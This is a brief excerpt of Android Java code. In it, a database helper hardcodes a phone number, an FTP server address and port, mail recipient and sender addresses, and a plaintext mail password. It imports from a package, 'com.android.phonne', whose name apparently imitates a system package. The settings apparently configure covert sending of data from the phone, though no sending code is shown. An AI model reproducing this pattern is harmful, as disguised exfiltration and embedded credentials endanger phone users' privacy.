...
import com.android.phonne.FileService;
...
public class DatabaseHelper extends SQLiteOpenHelper {
    ...
    public void onCreate(SQLiteDatabase db) {
        ...
        String telnumber = "13790009999";
        String ServerPort = "21"; //服务器端口
        String ServerAddress = "192.168.209.1"; //服务器IP
        String mailsendto = "aspzj@163.com";    //收件箱地址
        String mailpassword = "yxj";      //发件箱密码
        String mailfrom = "androidsendtomail@gmail.com"; //发件箱地址
